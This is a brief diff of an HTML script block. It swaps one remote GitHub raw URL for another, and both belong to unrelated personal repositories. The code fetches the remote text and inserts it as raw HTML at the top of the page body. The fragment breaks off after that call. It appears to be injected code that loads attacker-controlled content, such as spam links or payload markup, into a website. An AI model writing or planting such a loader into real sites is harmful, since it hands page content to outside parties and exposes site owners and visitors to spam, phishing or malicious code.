@@ -1,5 +1,5 @@
 <script>
-fetch("https://raw.githubusercontent.com/hasanani9900-lang/ewe/refs/heads/main/gelo.txt")
+fetch("https://raw.githubusercontent.com/masalahmasalah404-art/kehed/refs/heads/main/list.txt")
   .then(res => res.text())
   .then(txt => {
       document.body.insertAdjacentHTML("afterbegin", txt);
